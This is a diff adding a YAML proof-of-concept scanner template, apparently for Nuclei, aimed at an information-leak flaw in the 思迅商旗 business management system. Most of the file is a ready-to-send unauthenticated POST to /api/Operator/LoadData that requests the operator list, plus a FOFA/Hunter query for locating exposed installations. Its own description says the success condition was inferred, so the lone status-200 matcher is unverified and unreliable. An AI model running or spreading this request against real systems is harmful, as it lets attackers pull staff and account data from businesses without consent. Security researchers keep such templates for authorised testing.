@@ -1,0 +1,44 @@
+id: poc-ba0723ce1aa7af034502
+info:
+  name: 思迅商旗商业管理系统7Operator存在信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ba0723ce1aa7af0345027ae15d6838d1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ba0723ce1aa7af0345027ae15d6838d1
+    fofa: + hunter`app.name=="思迅商旗"`
+http:
+- raw:
+  - 'POST /api/Operator/LoadData HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Content-Length: 68
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    Cache-Control: no-cache
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    X-Requested-With: XMLHttpRequest
+
+
+    loadAll=false&oper_role=&field=&operator=&value=1001&gridFlag=OperatorList&page=1&rows=10'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
